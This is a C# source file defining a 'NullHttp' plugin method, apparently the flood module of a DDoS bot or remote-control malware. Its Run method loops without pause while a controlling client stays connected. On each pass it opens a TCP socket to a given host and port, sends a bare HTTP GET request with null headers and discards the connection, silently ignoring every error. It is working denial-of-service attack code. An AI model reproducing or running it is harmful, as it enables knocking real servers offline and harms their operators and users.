using System.Net.Sockets;
using System.Text;
using Plugin.Helper;

namespace Plugin.Methods;

internal class NullHttp : Method
{
	public string Name { get; } = "NullHttp";


	public void Run(string host, int port)
	{
		while (Client.itsConnect && !Common.CancellationTokenSource.IsCancellationRequested)
		{
			try
			{
				Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				socket.Connect(host, port);
				byte[] bytes = Encoding.ASCII.GetBytes("GET / HTTP/1.1\r\nHost: " + host + "\r\nUser-Agent: null\r\nReferrer: null\r\n\r\n");
				socket.Send(bytes);
				socket.Dispose();
			}
			catch
			{
			}
		}
	}
}
